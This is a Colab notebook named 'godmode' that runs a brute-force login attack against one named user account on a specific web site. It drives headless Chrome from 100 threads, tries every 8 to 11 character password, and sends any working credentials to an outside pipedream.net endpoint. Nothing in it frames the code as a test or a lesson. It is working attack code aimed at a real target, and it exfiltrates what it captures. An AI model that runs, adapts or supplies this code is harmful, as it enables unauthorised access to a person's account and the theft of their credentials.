{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/SHLEAK/random/blob/main/godmode.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "!pip install selenium"
      ],
      "metadata": {
        "id": "55E4bOjUHtXg"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "from selenium import webdriver\n",
        "from selenium.webdriver.chrome.options import Options\n",
        "from selenium.webdriver.common.by import By\n",
        "from selenium.webdriver.common.keys import Keys\n",
        "from concurrent.futures import ThreadPoolExecutor\n",
        "import time\n",
        "import itertools\n",
        "import string\n",
        "import requests"
      ],
      "metadata": {
        "id": "0W7KPG8YNi8g"
      },
      "execution_count": 10,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 11,
      "metadata": {
        "id": "qWm6rsv5VNRq"
      },
      "outputs": [],
      "source": [
        "def login(username, password):\n",
        "    chrome_options = Options()\n",
        "    chrome_options.add_argument(\"--headless\")\n",
        "    chrome_options.add_argument(\"--no-sandbox\")\n",
        "    chrome_options.add_argument(\"--disable-dev-shm-usage\")\n",
        "    chrome_driver = webdriver.Chrome(options=chrome_options)\n",
        "    \n",
        "    try:\n",
        "        chrome_driver.get(\"https://ssidollars.pythonanywhere.com/accounts/login/?next=/awards/student/560/spend/\")\n",
        "        \n",
        "        username_field = chrome_driver.find_element(By.ID, \"id_username\")\n",
        "        password_field = chrome_driver.find_element(By.ID, \"id_password\")\n",
        "        \n",
        "        username_field.send_keys(username)\n",
        "        password_field.send_keys(password)\n",
        "        password_field.send_keys(Keys.RETURN)\n",
        "        \n",
        "        time.sleep(5)\n",
        "        \n",
        "        if \"Your username and password didn't match.\" not in chrome_driver.page_source:\n",
        "            print(f\"Valid login: username - {username}, password - {password}\")\n",
        "            requests.get(\"https://eobluu4k4ukflxm.m.pipedream.net\", params={\"username\": username, \"password\": password})\n",
        "                \n",
        "        else:\n",
        "            print(f\"Invalid login: username - {username}, password - {password}\")\n",
        "        \n",
        "    except Exception as e:\n",
        "        print(f\"An error occurred while logging in: {str(e)}\")\n",
        "        \n",
        "    finally:\n",
        "        chrome_driver.quit()\n"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "characters = string.ascii_letters + string.digits + string.punctuation\n",
        "min_length = 8\n",
        "max_length = 11\n",
        "executor = ThreadPoolExecutor(max_workers=100)\n",
        "\n",
        "for length in range(min_length, max_length + 1):\n",
        "    for combination in itertools.product(characters, repeat=length):\n",
        "        password = \"\".join(combination)\n",
        "        executor.submit(login, \"peterkoo81\", password)\n",
        "\n",
        "executor.shutdown(wait=True)"
      ],
      "metadata": {
        "id": "ozJOgvOJNfZL"
      },
      "execution_count": null,
      "outputs": []
    }
  ],
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyM9N8CZgomD6nWkQXRdg9zi",
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}